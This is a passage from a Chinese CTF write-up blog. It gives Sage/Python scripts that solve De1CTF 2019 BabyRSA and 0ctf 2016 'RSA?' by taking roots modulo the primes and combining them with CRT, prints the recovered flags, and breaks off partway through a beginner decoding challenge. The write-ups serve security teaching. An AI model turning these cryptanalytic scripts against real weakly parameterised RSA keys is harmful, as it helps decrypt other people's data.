<p>可以采取上述有限域开方的算法。经检验，将e2去掉70这个因子时，可以求出d，那么接下里只要求<br>$$<br>c=m^{70}\ mod\ n<br>$$<br>脚本如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span>  *</span><br><span class="line"></span><br><span class="line">p = <span class="number">109935857933867829728985398563235455481120300859311421762540858762721955038310117609456763338082237907005937380873151279351831600225270995344096532750271070807051984097524900957809427861441436796934012393707770012556604479065826879107677002380580866325868240270494148512743861326447181476633546419262340100453</span></span><br><span class="line">q = <span class="number">114401188227479584680884046151299704656920536168767132916589182357583461053336386996123783294932566567773695426689447410311969456458574731187512974868297092638677515283584994416382872450167046416573472658841627690987228528798356894803559278308702635288537653192098514966089168123710854679638671424978221959513</span></span><br><span class="line">n = p*q</span><br><span class="line">c = <span class="number">8402626954844267019257189770827713712301490385606317353247232080660987949790497828588344121360142819597920380810717864248013962140671332736621869364023836966456292451288222487046361422315265333166292074987991328815414597857592078828853150603264183026137947540857054168476824895430715316542444821408894519825575271615168669882328867741339887771856046583079650726850387166574542239755300888839688437954412884568638812994672874904316709465173012849600200303575595413035671196508007653924536244993486097327630306519310746591152593249484415622597310848136958926253928859462221721082363622430393640647507855276596098618932</span></span><br><span class="line">e= <span class="number">14</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">R.&lt;x&gt; = Zmod(p)[]</span><br><span class="line">f = x ^ e - c</span><br><span class="line">f = f.monic()</span><br><span class="line">res1 = f.roots()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">R.&lt;x&gt; = Zmod(q)[]</span><br><span class="line">f = x ^e - c</span><br><span class="line">f = f.monic()</span><br><span class="line">res2 = f.roots()</span><br><span class="line">m=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> res1:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> res2:</span><br><span class="line">        m.append(CRT(<span class="built_in">int</span>(i[<span class="number">0</span>]),<span class="built_in">int</span>(j[<span class="number">0</span>]),p,q))</span><br><span class="line">e = <span class="number">5</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> C <span class="keyword">in</span> m:</span><br><span class="line">    R.&lt;x&gt; = Zmod(p)[]</span><br><span class="line">    f = x ^ e - C</span><br><span class="line">    f = f.monic()</span><br><span class="line">    res1 = f.roots()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    R.&lt;x&gt; = Zmod(q)[]</span><br><span class="line">    f = x ^e - C</span><br><span class="line">    f = f.monic()</span><br><span class="line">    res2 = f.roots()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> res1:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> res2:</span><br><span class="line">            M=CRT(<span class="built_in">int</span>(i[<span class="number">0</span>]),<span class="built_in">int</span>(j[<span class="number">0</span>]),p,q)</span><br><span class="line">            flag = long_to_bytes(M)</span><br><span class="line">            <span class="keyword">if</span> flag.startswith(<span class="string">b&#x27;de1ctf&#x27;</span>):</span><br><span class="line">                <span class="built_in">print</span>(long_to_bytes(M))</span><br></pre></td></tr></table></figure>

<p>跑了有一会出来</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">de1ctf&#123;9b10a98b-71bb-4bdf-a6ff-f319943de21f&#125;</span><br></pre></td></tr></table></figure>

<p>最后我检查了下别的师傅的WP，发现e1这么做确实有问题，la佬也说了共模攻击，e之间要互素的</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210709095550289.png" alt="De1CTF2019-BabyRSA共模攻击"></p>
<p>正确的做法，我没想到竟然可以iroot，运用小指数的攻击，很快就可以出来</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">e1 = <span class="number">15218928658178</span></span><br></pre></td></tr></table></figure>

<p>这不禁让我回忆了一下小指数rsa的攻击原理：<strong>还是爆破k ，所以e比较小还是都可以去试试的</strong></p>
<h3 id="0ctf-2016-RSA"><a href="#0ctf-2016-RSA" class="headerlink" title="0ctf 2016 - RSA?"></a>0ctf 2016 - RSA?</h3><blockquote>
<p>题目描述</p>
</blockquote>
<p>又是文件题型的rsa，让我祭出刚整理的OpenSSL</p>
<p>得到的数字如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n = <span class="number">0x2CAA9C09DC1061E507E5B7F39DDE3455FCFE127A2C69B621C83FD9D3D3EAA3AAC42147CD7188C53</span></span><br><span class="line">e = <span class="number">3</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>解题思路</p>
</blockquote>
<p>n这么短，e=3，狂喜；n用factordb分解得到三个素数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p = <span class="number">26440615366395242196516853423447</span></span><br><span class="line">q = <span class="number">27038194053540661979045656526063</span></span><br><span class="line">r = <span class="number">32581479300404876772405716877547</span></span><br></pre></td></tr></table></figure>

<p>然后由于上面有提示，是这一类型的题目，所以直接用有有限域开方了，稍微改了下脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c = <span class="number">2485360255306619684345131431867350432205477625621366642887752720125176463993839766742234027524</span></span><br><span class="line">n = <span class="number">0x2CAA9C09DC1061E507E5B7F39DDE3455FCFE127A2C69B621C83FD9D3D3EAA3AAC42147CD7188C53</span></span><br><span class="line">p = <span class="number">26440615366395242196516853423447</span></span><br><span class="line">q = <span class="number">27038194053540661979045656526063</span></span><br><span class="line">r = <span class="number">32581479300404876772405716877547</span></span><br><span class="line">e = <span class="number">3</span></span><br><span class="line"></span><br><span class="line">R.&lt;x&gt; = Zmod(p)[]</span><br><span class="line">f = x ^ e - c</span><br><span class="line">f = f.monic()</span><br><span class="line">res1 = f.roots()</span><br><span class="line"></span><br><span class="line">R.&lt;x&gt; = Zmod(q)[]</span><br><span class="line">f = x ^ e - c</span><br><span class="line">f = f.monic()</span><br><span class="line">res2 = f.roots()</span><br><span class="line"></span><br><span class="line">R.&lt;x&gt; = Zmod(r)[]</span><br><span class="line">f = x ^ e - c</span><br><span class="line">f = f.monic()</span><br><span class="line">res3 = f.roots()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> res1:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> res2:</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> res3:</span><br><span class="line">            <span class="comment"># 普普通通中国剩余定理</span></span><br><span class="line">            m = crt([<span class="built_in">int</span>(i[<span class="number">0</span>]),<span class="built_in">int</span>(j[<span class="number">0</span>]),<span class="built_in">int</span>(k[<span class="number">0</span>])],[p,q,r])</span><br><span class="line">            flag = long_to_bytes(m)</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<p>得到flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0ctf&#123;HahA!Thi5_1s_n0T_rSa~&#125;</span><br></pre></td></tr></table></figure>

<hr>
<p>最后赠送两道萌新赛的题目</p>
<h2 id="抱我"><a href="#抱我" class="headerlink" title="抱我"></a>抱我</h2><p>题目代码如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cstring = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz&#123;&#125;_0123456789&#x27;</span></span><br><span class="line">key = <span class="string">&#x27;flag&#123;********&#125;&#x27;</span></span><br><span class="line">length = <span class="number">300</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span>():</span></span><br><span class="line">    res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, length):</span><br><span class="line">        c = random.randint(<span class="number">0</span>, <span class="number">36</span>)</span><br><span class="line">        res += cstring[c]</span><br><span class="line">        <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">            c = random.randint(<span class="number">0</span>, <span class="built_in">len</span>(key) - <span class="number">1</span>)</span><br><span class="line">            res += key[c]</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="comment">#qdfl33&#123;6&#123;6gs3afa6&#123;3&#125;agf&#123;&#125;aagdf&#125;6fl36d&#123;dfl&#123;6ay6gafddfg&#125;&#123;j3f&#125;&#125;6la&#123;3&#125;bfdf3&#125;gla&#125;65&#125;lg6g6dflf0&#123;dfgd3fdfgc&#123;g6a&#125;a3&#123;6&#125;mfa&#123;&#125;f&#125;f&#125;&#125;&#125;3363&#125;&#125;f6a6a7g&#123;a&#125;g66&#123;d3xgfffg&#125;a&#125;3&#125;_&#123;lad&#125;a33ga5fd33&#125;&#123;&#123;dl&#125;&#123;&#125;f&#123;3da&#125;g&#125;3egfal&#123;a3l&#125;3f33&#125;dfdda&#123;3sa&#123;d6g&#123;ff&#125;6vgl33d6g333h&#123;gd&#123;&#123;lg6ldg&#123;ad&#123;3333a6oalf6a&#123;33&#123;de3&#123;fa&#125;ggl&#123;abfd&#125;6&#125;6&#125;&#125;l33fa&#125;f&#123;&#123;3&#123;3fla&#125;a6&#125;af&#125;&#123;amg&#125;&#123;&#123;d&#125;&#125;a6gallfg36&#123;g3dh&#123;&#123;&#123;a&#123;lfg3&#123;sll6g6gfaggid6d&#123;3afl&#125;3rff3gfad3d&#125;1dlllff6&#125;6&#125;h3g66gla336b&#123;6d3gf&#125;f&#123;30d63l&#125;3dfl6a3llfgld3&#123;&#125;qg&#125;gf&#125;dg&#123;6l&#125;3gal&#125;agdl6&#123;lg&#123;g&#125;ddfaaealf&#123;f3llgge3ad3&#123;3adf&#123;c&#125;fllf6f&#125;3at&#123;aag&#125;a66d3&#125;ad&#123;dfg&#123;&#125;dlz6gld&#125;6&#123;3flxgf&#123;3g3ald&#125;3g&#125;g63f6ggf3&#125;gfd&#125;f3ga3efllf6&#125;363fu6366fdlggfx6&#125;6l3&#125;&#125;a&#123;afg&#123;&#123;&#125;&#125;3fdaluaa&#125;al&#123;dg3dpfga&#125;&#125;l&#125;d3l4afg&#125;f&#123;d&#123;lgcfgffglal&#125;dq6l&#125;fgflldavdad6&#125;df&#123;&#125;dw&#125;l6g&#125;&#125;&#123;l3gf6fdaa66aadt&#125;f6lg&#123;dg33h&#123;fa3d&#123;&#125;laao3l6aal&#123;lfdv&#123;3dlf6af36bddg&#125;3ggad3o&#125;&#123;&#125;3g3fgddyffd3lddgdd6&#123;gdfl&#123;&#123;la3ild&#125;dg&#123;g&#125;dgef&#123;a3&#123;d6dfgq3adll&#123;fdadt&#125;66fdflg&#123;3x&#123;l3ll&#125;3&#123;&#123;g4a3af6lag3gdaf66dadg6dfglaf66l3f&#123;2&#125;6&#123;afaf&#125;3l6all&#125;&#123;l&#125;lfdla6&#123;fgff&#123;&#125;g13dl&#123;a&#123;6&#123;l6rd6&#125;&#125;l3dgg3_f&#123;66gll&#123;f6a3d3dga6&#123;lg&#125;&#123;g&#125;d&#123;6&#123;d36lll3dd6&#123;3dg3afal&#125;d&#125;gff26&#125;l&#125;al&#125;&#125;&#123;a6&#125;g66gaaff&#125;0fga&#123;g6dfld&#123;&#123;&#125;fglf&#123;af&#125;iddf6g6&#125;l361&#123;ag&#125;&#123;&#123;dlfak&#125;&#123;d3fa&#123;6&#123;godgg&#123;l36a&#123;gmllgfa3fa&#123;&#125;f&#125;&#125;3&#123;a6&#123;a3&#123;nafg&#123;l3d6&#125;g2lf6&#123;gg&#125;&#123;g&#125;sg&#123;ga&#123;63g&#123;&#125;la6g&#123;g6&#123;&#123;63o6&#123;l&#125;&#123;3&#125;l3ag36&#123;af33g3dw6d33f3lfdan&#123;dddad&#123;&#123;6l6&#125;&#125;fad63lgd1ffaa&#125;g&#125;3flkg3d&#125;aalf3lbgf&#123;g&#125;f&#125;&#125;d3agf&#123;ld&#123;dl3l4fl&#123;&#123;3fla&#125;&#125;r3g&#125;&#123;&#125;gda&#123;&#125;_df3g&#125;fa36gq&#125;la&#123;f&#123;6l&#125;66fgdg&#125;6ag6feaal6all3&#123;d&#125;lfgl&#125;&#125;&#123;&#123;6lal&#125;gf&#125;&#125;gfgd4d&#123;g36daff&#125;l6fd63ag6&#125;f7&#125;l3&#123;&#123;d&#125;&#123;al6lff66gda&#125;f7dfaf6&#125;fd3ldfgfl36gf337a6al663afd&#123;dff&#125;6&#125;df&#123;lt&#125;66&#125;ag6a3&#123;na&#125;3la&#123;6daa&#125;63fgldf3ggcl6dd&#123;3fg&#123;&#125;&#125;gfgaf&#123;633lpfadalldgglg&#123;l&#125;&#123;6&#125;gf&#123;agf6&#123;3l3a366wa6l6&#125;fdla&#125;wfl&#125;33&#125;d&#123;6d6aa&#125;laldag&#125;bgaa3gff&#125;3db&#123;gd&#125;lfga3&#123;&#125;ffddd6&#125;&#123;la4&#125;3&#123;agdg3&#123;&#125;bf33adg3a632d&#125;66f&#125;dgd67&#125;&#123;333dfg&#125;&#125;mgg3all3l&#125;fd6dd3&#123;g&#125;&#123;&#125;&#125;v6&#125;a6f6lgd3nfgg6aff3a&#125;d3da&#123;l3ldldz&#123;&#125;&#123;&#125;g3&#125;6fdg6f&#123;gd&#123;g3adx&#123;gll6&#123;fg3dc63lf&#125;6dl&#123;d63f3g&#123;3adda5f3dgfla3&#123;6&#125;gd&#123;3&#123;d6dlldal6g66&#125;&#123;ddp&#125;lalafd&#125;d&#123;lgl&#125;g6g33agjg&#125;33dgf&#125;lg0adlda6gfdlx&#123;3g&#125;&#123;g3a&#123;a76&#125;gdf3la&#125;lh&#125;l&#123;l&#123;&#125;&#125;a6gm&#123;gdd&#123;agg&#125;6xfgg&#125;&#123;336&#125;d_a&#123;df3&#125;df33jgf&#125;6d3&#125;&#125;f&#125;h3l&#123;6ga6fll2&#125;dd&#123;l36d66&#125;ldafdlga3gbgd&#125;d6df&#125;ff1gf6a&#123;ll3a3w&#123;3g&#125;allfafldal&#125;aal&#125;dlra33l3f&#125;3dff&#123;6&#123;6&#125;f&#125;la&#125;lgf&#125;&#125;&#125;gd&#123;f3z3l3&#123;d3636dpl3fag3&#123;faa1&#123;3ga33l&#125;6ll6&#123;gg6&#125;ddf&#125;t6g&#125;&#123;gl6ggl&#123;d&#125;aafalf&#123;lw6a&#123;dad&#125;&#125;a3x&#123;ada&#123;fg6d&#125;a3g&#123;d&#123;fggdawdfal&#123;&#123;3dlfndl636&#125;36alv633ada6gf6hd&#123;3l66ddlfpglda&#125;&#123;g3fdogdfa3&#125;3g&#125;3k3d3gda33&#125;dvd&#125;laa&#123;fa&#123;a&#123;&#123;&#125;a&#125;36&#125;&#125;&#125;&#123;r6d6&#123;a6&#125;&#125;6&#123;0laa36gd&#123;36kf63a&#123;3&#125;gga4af6&#125;f3gfgf0lf&#123;6g&#125;&#123;&#123;6&#125;pafg6dg&#125;g6&#123;b&#125;3d36ad6d&#123;h6f3agff&#125;63p&#125;&#123;l3ag3&#125;lf1f3dgd&#123;66a37&#125;&#125;&#125;d6gglaftaf3l6a3&#123;&#123;a7&#123;lgd3d&#125;fl6tlfl663lgg3wa&#125;33gl&#125;d&#123;3i6aaagl6&#123;&#123;&#125;n3gd&#125;l3l6&#125;l7a&#123;gf&#123;a&#125;l&#125;f3al&#123;alg63fln&#123;&#123;dd&#125;3l&#123;ll1&#125;&#123;3g&#125;6&#123;6&#125;&#123;u63&#123;f3&#123;g6lgf&#123;3d&#125;&#123;636&#125;&#123;u3&#125;&#123;f6d&#123;&#123;d3lg&#123;3l6aldf&#123;i&#123;f366&#123;f3l&#123;eg&#123;d&#123;gll&#123;3dhgdgfgaf&#123;&#125;&#125;g&#125;&#123;lg3&#123;a&#123;flm&#125;fa3ldf&#123;d32fagllf&#123;&#123;66q363&#125;dl66gg2fa6af6d6g37lffl&#123;d&#123;3lltgl33&#125;&#125;&#123;&#125;d3o&#123;lfld3d&#123;&#125;a6a663a66&#123;fabfd6ld333g3rafa&#125;&#125;fddfgt&#123;ggad3ag&#125;lr63af6lgg&#125;gy&#123;6&#123;&#123;6&#125;6dd626&#123;gl6a&#123;ad3b3df&#125;alf3afdaf66ll&#125;lf6jd&#125;3&#123;6dldfgg&#125;f3lg63l&#123;lr3ff3l&#123;gafaa&#125;f&#125;agl6l33xglfggg&#123;&#123;&#123;fq66&#125;g6lfa3&#123;736lllflalglf&#125;&#123;&#125;gf&#123;aggdg3&#123;a&#125;&#125;da&#123;fp6fglla3l&#125;65gf36&#123;l6dl&#125;g&#125;f&#123;la6&#123;l&#123;fpf&#123;&#125;63&#123;f6gdfaalf6&#123;dffgdgf&#123;lgaf&#123;f&#123;56&#125;g6af63l6a&#125;a&#125;&#123;lfa&#123;3gblda&#125;l&#125;&#123;fl&#123;s&#123;g&#125;&#125;6&#123;g6la56g6g3&#123;f&#125;ddfaa&#123;l&#125;dg6g&#125;0glda6&#123;6d&#125;ff&#125;f&#123;6laadd6zaag&#123;l3l&#125;6dc&#125;f3gg&#125;lffgsag&#125;l3l6d3apd3gd3fd&#125;&#125;aga3ga&#125;a3&#123;6f1f3df&#123;&#123;d&#125;&#125;av3laf&#125;6adf3_d&#123;afa6f&#125;adt&#123;faf&#123;d33aaol3&#125;&#123;l&#125;ld&#125;3yl3a6a&#123;fa6&#125;_d33gf3fll&#125;of&#123;6lad&#125;&#125;fdx&#125;6d&#123;f&#125;ll63ugag66d&#123;6f3&#125;33&#125;al6l&#123;ffwf&#123;&#125;&#123;fl3a36ogg3&#123;&#125;&#125;g6&#125;3hl&#125;6dg6ld&#123;digaa&#125;g&#125;&#123;&#123;l&#125;da&#123;ddg3&#123;&#123;d&#125;w3&#125;ld&#125;adgg3m&#123;lad&#123;gd&#123;a&#123;7afff&#125;&#123;d6&#125;fsf3&#123;f&#125;gflgavfldg6a6&#123;ldqf&#125;fd&#123;f3f3&#125;73ddad&#123;666fz6&#125;d&#123;3&#123;l36a1d6fal3fl6lrl&#123;&#125;aga&#123;fdlsa&#125;&#123;6l6ag3gtgdg&#123;6lgf3f</span></span><br></pre></td></tr></table></figure>

<p> 看着挺迷，开始还以为又是MT类型的题目，当我把可能出现key中的字符给提取出来后，发现并不多；脚本如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cstring = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz&#123;&#125;_0123456789&#x27;</span></span><br><span class="line">cipher = <span class="string">&#x27;qdfl33&#123;6&#123;6gs3afa6&#123;3&#125;agf&#123;&#125;aagdf&#125;6fl36d&#123;dfl&#123;6ay6gafddfg&#125;&#123;j3f&#125;&#125;6la&#123;3&#125;bfdf3&#125;gla&#125;65&#125;lg6g6dflf0&#123;dfgd3fdfgc&#123;g6a&#125;a3&#123;6&#125;mfa&#123;&#125;f&#125;f&#125;&#125;&#125;3363&#125;&#125;f6a6a7g&#123;a&#125;g66&#123;d3xgfffg&#125;a&#125;3&#125;_&#123;lad&#125;a33ga5fd33&#125;&#123;&#123;dl&#125;&#123;&#125;f&#123;3da&#125;g&#125;3egfal&#123;a3l&#125;3f33&#125;dfdda&#123;3sa&#123;d6g&#123;ff&#125;6vgl33d6g333h&#123;gd&#123;&#123;lg6ldg&#123;ad&#123;3333a6oalf6a&#123;33&#123;de3&#123;fa&#125;ggl&#123;abfd&#125;6&#125;6&#125;&#125;l33fa&#125;f&#123;&#123;3&#123;3fla&#125;a6&#125;af&#125;&#123;amg&#125;&#123;&#123;d&#125;&#125;a6gallfg36&#123;g3dh&#123;&#123;&#123;a&#123;lfg3&#123;sll6g6gfaggid6d&#123;3afl&#125;3rff3gfad3d&#125;1dlllff6&#125;6&#125;h3g66gla336b&#123;6d3gf&#125;f&#123;30d63l&#125;3dfl6a3llfgld3&#123;&#125;qg&#125;gf&#125;dg&#123;6l&#125;3gal&#125;agdl6&#123;lg&#123;g&#125;ddfaaealf&#123;f3llgge3ad3&#123;3adf&#123;c&#125;fllf6f&#125;3at&#123;aag&#125;a66d3&#125;ad&#123;dfg&#123;&#125;dlz6gld&#125;6&#123;3flxgf&#123;3g3ald&#125;3g&#125;g63f6ggf3&#125;gfd&#125;f3ga3efllf6&#125;363fu6366fdlggfx6&#125;6l3&#125;&#125;a&#123;afg&#123;&#123;&#125;&#125;3fdaluaa&#125;al&#123;dg3dpfga&#125;&#125;l&#125;d3l4afg&#125;f&#123;d&#123;lgcfgffglal&#125;dq6l&#125;fgflldavdad6&#125;df&#123;&#125;dw&#125;l6g&#125;&#125;&#123;l3gf6fdaa66aadt&#125;f6lg&#123;dg33h&#123;fa3d&#123;&#125;laao3l6aal&#123;lfdv&#123;3dlf6af36bddg&#125;3ggad3o&#125;&#123;&#125;3g3fgddyffd3lddgdd6&#123;gdfl&#123;&#123;la3ild&#125;dg&#123;g&#125;dgef&#123;a3&#123;d6dfgq3adll&#123;fdadt&#125;66fdflg&#123;3x&#123;l3ll&#125;3&#123;&#123;g4a3af6lag3gdaf66dadg6dfglaf66l3f&#123;2&#125;6&#123;afaf&#125;3l6all&#125;&#123;l&#125;lfdla6&#123;fgff&#123;&#125;g13dl&#123;a&#123;6&#123;l6rd6&#125;&#125;l3dgg3_f&#123;66gll&#123;f6a3d3dga6&#123;lg&#125;&#123;g&#125;d&#123;6&#123;d36lll3dd6&#123;3dg3afal&#125;d&#125;gff26&#125;l&#125;al&#125;&#125;&#123;a6&#125;g66gaaff&#125;0fga&#123;g6dfld&#123;&#123;&#125;fglf&#123;af&#125;iddf6g6&#125;l361&#123;ag&#125;&#123;&#123;dlfak&#125;&#123;d3fa&#123;6&#123;godgg&#123;l36a&#123;gmllgfa3fa&#123;&#125;f&#125;&#125;3&#123;a6&#123;a3&#123;nafg&#123;l3d6&#125;g2lf6&#123;gg&#125;&#123;g&#125;sg&#123;ga&#123;63g&#123;&#125;la6g&#123;g6&#123;&#123;63o6&#123;l&#125;&#123;3&#125;l3ag36&#123;af33g3dw6d33f3lfdan&#123;dddad&#123;&#123;6l6&#125;&#125;fad63lgd1ffaa&#125;g&#125;3flkg3d&#125;aalf3lbgf&#123;g&#125;f&#125;&#125;d3agf&#123;ld&#123;dl3l4fl&#123;&#123;3fla&#125;&#125;r3g&#125;&#123;&#125;gda&#123;&#125;_df3g&#125;fa36gq&#125;la&#123;f&#123;6l&#125;66fgdg&#125;6ag6feaal6all3&#123;d&#125;lfgl&#125;&#125;&#123;&#123;6lal&#125;gf&#125;&#125;gfgd4d&#123;g36daff&#125;l6fd63ag6&#125;f7&#125;l3&#123;&#123;d&#125;&#123;al6lff66gda&#125;f7dfaf6&#125;fd3ldfgfl36gf337a6al663afd&#123;dff&#125;6&#125;df&#123;lt&#125;66&#125;ag6a3&#123;na&#125;3la&#123;6daa&#125;63fgldf3ggcl6dd&#123;3fg&#123;&#125;&#125;gfgaf&#123;633lpfadalldgglg&#123;l&#125;&#123;6&#125;gf&#123;agf6&#123;3l3a366wa6l6&#125;fdla&#125;wfl&#125;33&#125;d&#123;6d6aa&#125;laldag&#125;bgaa3gff&#125;3db&#123;gd&#125;lfga3&#123;&#125;ffddd6&#125;&#123;la4&#125;3&#123;agdg3&#123;&#125;bf33adg3a632d&#125;66f&#125;dgd67&#125;&#123;333dfg&#125;&#125;mgg3all3l&#125;fd6dd3&#123;g&#125;&#123;&#125;&#125;v6&#125;a6f6lgd3nfgg6aff3a&#125;d3da&#123;l3ldldz&#123;&#125;&#123;&#125;g3&#125;6fdg6f&#123;gd&#123;g3adx&#123;gll6&#123;fg3dc63lf&#125;6dl&#123;d63f3g&#123;3adda5f3dgfla3&#123;6&#125;gd&#123;3&#123;d6dlldal6g66&#125;&#123;ddp&#125;lalafd&#125;d&#123;lgl&#125;g6g33agjg&#125;33dgf&#125;lg0adlda6gfdlx&#123;3g&#125;&#123;g3a&#123;a76&#125;gdf3la&#125;lh&#125;l&#123;l&#123;&#125;&#125;a6gm&#123;gdd&#123;agg&#125;6xfgg&#125;&#123;336&#125;d_a&#123;df3&#125;df33jgf&#125;6d3&#125;&#125;f&#125;h3l&#123;6ga6fll2&#125;dd&#123;l36d66&#125;ldafdlga3gbgd&#125;d6df&#125;ff1gf6a&#123;ll3a3w&#123;3g&#125;allfafldal&#125;aal&#125;dlra33l3f&#125;3dff&#123;6&#123;6&#125;f&#125;la&#125;lgf&#125;&#125;&#125;gd&#123;f3z3l3&#123;d3636dpl3fag3&#123;faa1&#123;3ga33l&#125;6ll6&#123;gg6&#125;ddf&#125;t6g&#125;&#123;gl6ggl&#123;d&#125;aafalf&#123;lw6a&#123;dad&#125;&#125;a3x&#123;ada&#123;fg6d&#125;a3g&#123;d&#123;fggdawdfal&#123;&#123;3dlfndl636&#125;36alv633ada6gf6hd&#123;3l66ddlfpglda&#125;&#123;g3fdogdfa3&#125;3g&#125;3k3d3gda33&#125;dvd&#125;laa&#123;fa&#123;a&#123;&#123;&#125;a&#125;36&#125;&#125;&#125;&#123;r6d6&#123;a6&#125;&#125;6&#123;0laa36gd&#123;36kf63a&#123;3&#125;gga4af6&#125;f3gfgf0lf&#123;6g&#125;&#123;&#123;6&#125;pafg6dg&#125;g6&#123;b&#125;3d36ad6d&#123;h6f3agff&#125;63p&#125;&#123;l3ag3&#125;lf1f3dgd&#123;66a37&#125;&#125;&#125;d6gglaftaf3l6a3&#123;&#123;a7&#123;lgd3d&#125;fl6tlfl663lgg3wa&#125;33gl&#125;d&#123;3i6aaagl6&#123;&#123;&#125;n3gd&#125;l3l6&#125;l7a&#123;gf&#123;a&#125;l&#125;f3al&#123;alg63fln&#123;&#123;dd&#125;3l&#123;ll1&#125;&#123;3g&#125;6&#123;6&#125;&#123;u63&#123;f3&#123;g6lgf&#123;3d&#125;&#123;636&#125;&#123;u3&#125;&#123;f6d&#123;&#123;d3lg&#123;3l6aldf&#123;i&#123;f366&#123;f3l&#123;eg&#123;d&#123;gll&#123;3dhgdgfgaf&#123;&#125;&#125;g&#125;&#123;lg3&#123;a&#123;flm&#125;fa3ldf&#123;d32fagllf&#123;&#123;66q363&#125;dl66gg2fa6af6d6g37lffl&#123;d&#123;3lltgl33&#125;&#125;&#123;&#125;d3o&#123;lfld3d&#123;&#125;a6a663a66&#123;fabfd6ld333g3rafa&#125;&#125;fddfgt&#123;ggad3ag&#125;lr63af6lgg&#125;gy&#123;6&#123;&#123;6&#125;6dd626&#123;gl6a&#123;ad3b3df&#125;alf3afdaf66ll&#125;lf6jd&#125;3&#123;6dldfgg&#125;f3lg63l&#123;lr3ff3l&#123;gafaa&#125;f&#125;agl6l33xglfggg&#123;&#123;&#123;fq66&#125;g6lfa3&#123;736lllflalglf&#125;&#123;&#125;gf&#123;aggdg3&#123;a&#125;&#125;da&#123;fp6fglla3l&#125;65gf36&#123;l6dl&#125;g&#125;f&#123;la6&#123;l&#123;fpf&#123;&#125;63&#123;f6gdfaalf6&#123;dffgdgf&#123;lgaf&#123;f&#123;56&#125;g6af63l6a&#125;a&#125;&#123;lfa&#123;3gblda&#125;l&#125;&#123;fl&#123;s&#123;g&#125;&#125;6&#123;g6la56g6g3&#123;f&#125;ddfaa&#123;l&#125;dg6g&#125;0glda6&#123;6d&#125;ff&#125;f&#123;6laadd6zaag&#123;l3l&#125;6dc&#125;f3gg&#125;lffgsag&#125;l3l6d3apd3gd3fd&#125;&#125;aga3ga&#125;a3&#123;6f1f3df&#123;&#123;d&#125;&#125;av3laf&#125;6adf3_d&#123;afa6f&#125;adt&#123;faf&#123;d33aaol3&#125;&#123;l&#125;ld&#125;3yl3a6a&#123;fa6&#125;_d33gf3fll&#125;of&#123;6lad&#125;&#125;fdx&#125;6d&#123;f&#125;ll63ugag66d&#123;6f3&#125;33&#125;al6l&#123;ffwf&#123;&#125;&#123;fl3a36ogg3&#123;&#125;&#125;g6&#125;3hl&#125;6dg6ld&#123;digaa&#125;g&#125;&#123;&#123;l&#125;da&#123;ddg3&#123;&#123;d&#125;w3&#125;ld&#125;adgg3m&#123;lad&#123;gd&#123;a&#123;7afff&#125;&#123;d6&#125;fsf3&#123;f&#125;gflgavfldg6a6&#123;ldqf&#125;fd&#123;f3f3&#125;73ddad&#123;666fz6&#125;d&#123;3&#123;l36a1d6fal3fl6lrl&#123;&#125;aga&#123;fdlsa&#125;&#123;6l6ag3gtgdg&#123;6lgf3f&#x27;</span></span><br><span class="line"></span><br><span class="line">space = <span class="string">&#x27;&#x27;</span></span><br><span class="line">key = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cipher)):</span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">11</span> == <span class="number">0</span>:</span><br><span class="line">        space += cipher[i]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        key += cipher[i]</span><br><span class="line"></span><br><span class="line">flag = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(space)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> key[i:i+<span class="number">10</span>]:</span><br><span class="line">        <span class="keyword">if</span> j <span class="keyword">not</span> <span class="keyword">in</span> flag:</span><br><span class="line">            flag.append(j)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<p>出来是</p>
